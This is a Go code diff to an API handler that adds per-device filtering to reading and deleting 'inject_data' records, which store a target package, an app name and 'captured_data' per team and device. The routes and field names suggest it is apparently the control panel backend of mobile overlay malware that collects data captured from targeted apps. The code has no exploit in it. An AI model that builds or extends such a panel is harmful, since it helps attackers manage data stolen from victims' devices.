@@ -1,6 +1,7 @@
 package api
 
 import (
+	"database/sql"
 	"encoding/json"
 	"net/http"
 	"strconv"
@@ -381,18 +382,25 @@ func HandleInjectToggle(w http.ResponseWriter, r *http.Request) {
 func HandleInjectData(w http.ResponseWriter, r *http.Request) {
 	teamID := SessionTeamID(r)
 
+	deviceID := strings.TrimPrefix(r.URL.Path, "/api/panel/injects/data/")
+	deviceID = strings.TrimRight(deviceID, "/")
+
 	switch r.Method {
 	case http.MethodGet:
-		getInjectData(w, r, teamID)
+		getInjectData(w, r, teamID, deviceID)
 	case http.MethodDelete:
-		db.DB.Exec("DELETE FROM inject_data WHERE team_id = ?", teamID)
+		if deviceID != "" {
+			db.DB.Exec("DELETE FROM inject_data WHERE team_id = ? AND device_id = ?", teamID, deviceID)
+		} else {
+			db.DB.Exec("DELETE FROM inject_data WHERE team_id = ?", teamID)
+		}
 		writeJSON(w, map[string]any{"success": true})
 	default:
 		writeJSON(w, map[string]any{"error": "method not allowed"})
 	}
 }
 
-func getInjectData(w http.ResponseWriter, r *http.Request, teamID string) {
+func getInjectData(w http.ResponseWriter, r *http.Request, teamID, deviceID string) {
 	limit := 100
 	if l := r.URL.Query().Get("limit"); l != "" {
 		if n, err := strconv.Atoi(l); err == nil && n > 0 {
@@ -400,10 +408,19 @@ func getInjectData(w http.ResponseWriter, r *http.Request, teamID string) {
 		}
 	}
 
-	rows, err := db.DB.Query(
-		`SELECT id, device_id, target_package, app_name, captured_data, created_at FROM inject_data WHERE team_id = ? ORDER BY id DESC LIMIT ?`,
-		teamID, limit,
-	)
+	var rows *sql.Rows
+	var err error
+	if deviceID != "" {
+		rows, err = db.DB.Query(
+			`SELECT id, device_id, target_package, app_name, captured_data, created_at FROM inject_data WHERE team_id = ? AND device_id = ? ORDER BY id DESC LIMIT ?`,
+			teamID, deviceID, limit,
+		)
+	} else {
+		rows, err = db.DB.Query(
+			`SELECT id, device_id, target_package, app_name, captured_data, created_at FROM inject_data WHERE team_id = ? ORDER BY id DESC LIMIT ?`,
+			teamID, limit,
+		)
+	}
 	if err != nil {
 		writeJSON(w, map[string]any{"data": []any{}})
 		return
